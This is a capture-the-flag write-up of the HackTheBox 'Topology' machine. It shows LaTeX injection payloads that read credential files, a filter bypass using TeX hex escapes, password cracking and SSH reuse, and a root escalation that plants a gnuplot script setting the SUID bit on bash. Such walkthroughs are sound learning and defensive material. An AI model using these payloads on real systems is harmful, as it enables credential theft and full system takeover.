---
layout: post
title: "HTB: Topology"
subtitle: "LaTeX injection LFI read an htpasswd hash that cracked to SSH, then a root cron running gnuplot on a world-writable dir set the bash SUID bit"
date: 2023-06-19
tags: [htb, linux, lfi, latex-injection, cron, privesc]
category: writeups
kind: machine
tldr: "A LaTeX equation renderer let me read arbitrary files with lstinputlisting. I pulled the dev vhost's htpasswd hash, cracked it with john, and logged in over SSH. Root came from a cron that ran every .plt file in a world-writable /opt/gnuplot as root, so a gnuplot system call set the SUID bit on bash."
---

## the box

Topology is an easy Linux box from HackTheBox. It runs OpenSSH 8.2p1 (Ubuntu 4ubuntu0.7) and Apache 2.4.41 on Ubuntu 20.04. The site is Miskatonic University's Topology Group, a math department page. The interesting part is a LaTeX-to-image generator on a `latex.` vhost. That endpoint takes raw LaTeX, and LaTeX is a full programming language, so the question was never "is this exploitable" but "which primitive survives their filter."

The path is short. LaTeX injection for arbitrary file read, pull an `.htpasswd` hash off a dev vhost, crack it, reuse the password over SSH, then abuse a root cron that runs gnuplot over a world-writable directory to set SUID on bash.

## recon

Full TCP sweep then a versioned scan on the two open ports:

```bash
nmap -p- --min-rate 10000 -T4 10.10.18.217
nmap -p 22,80 -sCV 10.10.18.217
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Miskatonic University | Topology Group
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Stock Ubuntu service versions, so the web is the way in. I added the hostname and browsed port 80.

```bash
echo '10.10.18.217 topology.htb' | sudo tee -a /etc/hosts
```

The homepage was a department site. It leaked a contact email, `lklein@topology.htb`, which is a username candidate to keep in the back pocket. A page also linked to a LaTeX equation generator on another host. That hint plus the email pushed me toward virtual host enumeration.

```bash
ffuf -u http://10.10.18.217 -H "Host: FUZZ.topology.htb" \
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -ac
```

Three subdomains came back: `dev`, `stats`, and `latex`. I added all of them:

```bash
echo '10.10.18.217 topology.htb dev.topology.htb stats.topology.htb latex.topology.htb' | sudo tee -a /etc/hosts
```

Walking each one:

- `stats.topology.htb` returned 200 with a network-consumption graph and a `/files` directory listing. The graphs are the same gnuplot output that turns up later in the privesc, which is a nice piece of foreshadowing once you know where it goes.
- `dev.topology.htb` returned 401, sitting behind HTTP basic auth. Basic auth on Apache means an `.htpasswd` file somewhere on disk, and that hash is the thing to go after.
- `latex.topology.htb/equation.php` rendered LaTeX equations into images on the fly. This is the LaTeX-to-image utility the homepage linked to, and it takes the equation in the `eqn` parameter.

## foothold

My first instinct on a LaTeX renderer was command injection, and I burned a while on it before backing off. Two blog posts reset my approach: `0day.work/hacking-with-latex/` and the infosecwriteups "LaTeX to RCE" post. The takeaway is that LaTeX is most reliably exploited for file read and path traversal, not direct shell-out, because the classic `\write18` shell escape is disabled in almost every hardened install.

The endpoint also ran a blacklist that stripped the obvious primitives. From testing, these were all blocked:

```
\begin   \immediate   \usepackage   \input   \write   \loop
\include   \@   \while   \def   \url   \href   \end
```

That kills `\write18` (needs `\immediate\write18`) and the usual `\input{}` LFI. So I went looking for a file-read command that was not on the list. The `listings` package ships `\lstinputlisting`, which reads a file into the document so it can be typeset as source code. It was not blacklisted. The only catch is that the endpoint expects math, so a bare command throws a render error. Wrapping it in dollar signs drops into inline math mode and the renderer accepts it:

```
$\lstinputlisting{/etc/hostname}$
```

That returned the hostname rendered into the equation image, which confirmed arbitrary file read through the LaTeX engine. With the primitive working, I went straight for the basic-auth credential on the dev vhost:

```
$\lstinputlisting{/var/www/dev/.htpasswd}$
```

Through the endpoint, URL-encoded:

```
http://latex.topology.htb/equation.php?eqn=%24%5Clstinputlisting%7B%2Fvar%2Fwww%2Fdev%2F.htpasswd%7D%24&submit=
```

The image came back with the htpasswd entry:

```
vdaisley:$apr1$10NUB/S2$58eeNVirnRDB5zAIbIxTYO
```

The `$apr1$` prefix is Apache's MD5 crypt format, which john and hashcat both crack. There was also an unintended bypass worth knowing: even the blacklisted commands fell to TeX hex escapes, where `^^77` is the character `w`, so `\^^77rite` slips past a filter looking for the literal string `\write`. That would have reopened `\write` for writing a file (a webshell into the latex tempfiles directory, for example). I did not need it, `\lstinputlisting` was enough.

## user

I cracked the apr1 hash with john and the rockyou list:

```bash
john --format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt hash
```

```
calculus20       (vdaisley)
```

The dev vhost itself held nothing once I authenticated to it, but the password was the point: it was reused for the system account. `vdaisley:calculus20` worked over SSH:

```bash
sshpass -p calculus20 ssh vdaisley@topology.htb
```

The user flag was in the home directory.

## root

I checked sudo first and got a hard no:

```bash
sudo -l
```

```
Sorry, user vdaisley may not run sudo on topology.
```

No SUID binary stood out and the box was not vulnerable to the polkit and pwnkit CVEs in any usable way, so I moved to enumeration with linpeas and pspy. linpeas flagged `/opt` as unexpectedly non-empty, with a `gnuplot` directory that was world-writable but not world-readable:

```
╔══════════╣ Unexpected in /opt (usually empty)
drwx-wx-wx  2 root root 4096 Jun 14 07:45 gnuplot
```

`drwx-wx-wx` means I can write into it and traverse it, but not list it. That is a strong signal something writes there on a schedule. pspy confirmed it, a root cron walked that directory and ran every plot file through gnuplot:

```
CMD: UID=0  PID=2776 | /bin/sh /opt/gnuplot/getdata.sh
CMD: UID=0  PID=2781 | /bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \;
CMD: UID=0  PID=2787 | gnuplot /opt/gnuplot/loadplot.plt
CMD: UID=0  PID=2788 | gnuplot /opt/gnuplot/networkplot.plt
```

So the chain is clear: anything I drop into `/opt/gnuplot` named `*.plt` runs as root the next time the cron fires. The job is what produces the graphs on `stats.topology.htb`, which is why that subdomain was the early hint.

The first attempts to inject POSIX commands directly failed, because gnuplot only understands its own scripting syntax, not `chmod` on its own line. The gnuplot manual has a `system` command that shells out to the OS, which is the bridge. I dropped a plot file that sets the SUID bit on bash:

```bash
echo 'system "chmod u+s /bin/bash"' > /opt/gnuplot/priv.plt
```

When the cron next ran, gnuplot executed my `system` call as root and bash became SUID:

```bash
ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

Then `-p` preserves the effective root UID and gives a root shell:

```bash
/bin/bash -p
```

```
bash-5.0# id
uid=1000(vdaisley) gid=1000(vdaisley) euid=0(root) groups=1000(vdaisley)
```

From there the root flag was readable.

## takeaway

LaTeX renderers are a file-read sink by default, because the language is built to pull external files into a document. The blacklist tried to stop the dangerous commands, but it enumerated badness instead of allowing known-good math, and it missed `\lstinputlisting` entirely. Even the commands it did block fell to hex escapes, which is the standard outcome of any character-level filter on a language that has its own escape syntax. Storing the basic-auth hash where the web user can read it leaked a crackable credential, and reusing it for the system account turned file read into a shell.

The root step was a textbook world-writable cron target. A privileged job that globs and executes files from a directory anyone can write to is arbitrary code execution as the job's owner, and gnuplot's `system` command is just the convenient way to spend it. Running the cron over a root-only directory, or pinning it to specific known files, would have closed it.
